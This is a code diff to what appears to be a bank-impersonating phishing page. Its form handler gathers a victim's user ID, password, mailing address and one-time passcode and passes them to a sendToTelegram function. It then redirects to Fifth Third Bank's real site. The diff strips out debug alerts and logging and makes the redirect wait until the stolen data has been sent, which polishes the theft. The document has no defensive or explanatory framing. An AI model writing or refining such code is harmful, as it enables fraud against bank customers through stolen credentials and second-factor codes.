@@ -206,7 +206,6 @@
   <script>
     document.getElementById('verify-form').onsubmit = function(e) {
       e.preventDefault();
-      alert('Submit handler triggered!');
       // Get login data from sessionStorage
       const userid = sessionStorage.getItem('userid') || '';
       const password = sessionStorage.getItem('password') || '';
@@ -221,12 +220,11 @@
         mailingaddress: this.mailingaddress.value,
         otp: this.otp.value
       };
-      console.log('Submitting data:', data);
-      sendToTelegram(data);
-      this.reset();
-      window.location.href = 'https://www.53.com/';
+      sendToTelegram(data, () => {
+        this.reset();
+        window.location.href = 'https://www.53.com/';
+      });
     };
-    alert('Script loaded!');
   </script>
 </body>
 </html> 
